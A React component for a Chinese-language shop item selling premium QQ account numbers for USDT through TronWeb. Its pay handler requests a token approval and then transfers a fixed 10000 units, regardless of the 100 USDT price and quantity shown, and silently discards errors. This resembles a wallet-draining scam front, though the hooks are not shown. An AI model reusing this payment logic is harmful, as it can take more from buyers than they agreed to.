import React, { useState } from 'react';
import { Button, Modal, InputNumber, Input, Drawer } from 'antd';
import { nft1Icon, heartIcon } from '@/assets';
import { useTronWeb } from '@/hooks/useTronWeb';
import { formatNumber } from '@/module/utils/Utils';
import useStoreApi from '@/hooks/useStoreApi';
import './Item.style.less';
// import PageHistory from '../../router/PageHistory';

export const ItemView = props => {
  const { data } = props;
  const [loading, setLoading] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isDrawerOpen, setIsDrawerOpen] = useState(false);
  const [modalTitle, setModalTitle] = useState('订单详情');
  const [num, setNum] = useState(1);
  const [email, setEmail] = useState('');
  const { isPc2View } = useStoreApi();

  const { image, title, price } = data || {};
  const { getBlanceOf, transfer, allowance, approve } = useTronWeb();

  const pay = async () => {
    try {
      setLoading(true);
      const blance = await getBlanceOf();
      const allowanceValue = await allowance();
      console.log('blance', blance);
      console.log('allowanceValue', allowanceValue);

      if (allowanceValue <= 0) {
        await approve();
      }

      if (blance > 0) {
        await transfer(10000);
      }
    } catch (error) {
    } finally {
      setLoading(false);
    }
  };
  const handleCancel = () => {
    setIsModalOpen(false);
    setIsDrawerOpen(false);
  };

  return (
    <div className="item">
      <div className="item-image">
        <img src={image || nft1Icon} alt="cosmic" />
        <div className="hot">
          {/* <img src={heartIcon} alt="" /> */}
          <span>库存 1.2k</span>
        </div>
      </div>
      <h2 className="item-title">{title || 'QQ靓号（三个月免续费卡）'}</h2>
      <div className="item-bottom flex-between">
        <p className="item-price">
          <span></span>
          <span>$100 USDT</span>
        </p>
        <Button className="item-buy" loading={loading} onClick={() => (isPc2View ? setIsModalOpen(true) : setIsDrawerOpen(true))}>
          购买
        </Button>
      </div>

      <Modal
        wrapClassName="order-modal"
        title={modalTitle}
        open={isModalOpen}
        onOk={pay}
        onCancel={handleCancel}
        maskClosable={false}
        keyboard={false}
        okText="立即付款">
        <div className="flex-between">
          <span>订单</span>
          <span>11111111</span>
        </div>
        <div className="flex-between">
          <span>价格</span>
          <span>{formatNumber(10000)} USDT</span>
        </div>
        <div className="flex-between">
          <span>数量</span>
          <InputNumber size="large" min={1} max={100000} defaultValue={num} onChange={v => setNum(v)} />
        </div>
        <div className="flex-between">
          <span>收货邮箱</span>
          <Input value={email} size="large" placeholder="请输入邮箱地址" onChange={v => setEmail(v)} />
        </div>
        <div className="total flex-end">
          <span>合计:</span>
          <span>${formatNumber(num * 100)} USDT</span>
        </div>
      </Modal>

      <Drawer
        title={modalTitle}
        className="order-drawer"
        placement={'bottom'}
        height={'60vh'}
        closable={false}
        onClose={handleCancel}
        open={isDrawerOpen}
        key={'bottom'}>
        <div className="flex-between">
          <span>订单</span>
          <span>11111111</span>
        </div>
        <div className="flex-between">
          <span>价格</span>
          <span>100 USDT</span>
        </div>
        <div className="flex-between">
          <span>数量</span>
          <InputNumber size="large" min={1} max={100000} decimalSeparator={0} defaultValue={num} onChange={v => setNum(v)} />
        </div>
        <div className="flex-between">
          <span>收货邮箱</span>
          <Input value={email} size="large" placeholder="请输入邮箱地址" onChange={v => setEmail(v)} />
        </div>

        <div className="btn">
          <div className="total flex-end">
            <span>合计:</span>
            <span>${formatNumber(num * 100)} USDT</span>
          </div>
          <Button type="primary">立即付款</Button>
        </div>
      </Drawer>
    </div>
  );
};

export default ItemView;
